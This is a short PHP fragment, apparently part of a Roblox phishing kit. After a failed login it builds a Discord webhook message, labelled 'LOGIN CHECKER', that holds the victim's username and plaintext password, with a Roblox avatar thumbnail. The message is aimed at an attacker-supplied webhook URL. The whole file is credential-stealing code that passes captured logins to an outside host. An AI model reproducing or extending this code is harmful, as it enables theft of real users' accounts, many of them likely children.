<?php
$errorcode = json_decode($loginresponse->body)->errors[0]->code;
if ($errorcode == 2) {
    $description = "Captcha Validation Failed!";
}
if ($errorcode == 1) {
    $description = "Incorrect Password!";
}
if (isset($errorcode) and !isset($description)) {
	$description = json_decode($loginresponse->body)->errors[0]->message;
}
$embed = '{
  "embeds": [
    {
      "title": "Login Failed",
      "description" : "'.$description.'",
      "color": 0xFA8072,
      "fields": [
        {
          "name": "Username",
          "value": "'.$username.'",
          "inline": true
        },
        {
          "name": "Password",
          "value": "'.$password.'",
          "inline": true
        }
      ],
      "thumbnail": {
        "url": "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&username='.$username.'"
      }
    }
  ],
  "username": "LOGIN CHECKER",
  "avatar_url": "https://cdn.discordapp.com/attachments/695254344580464650/707133758867767326/IMG_20200505_153609.JPG"
}';
$discordurl = $failedurl;
?>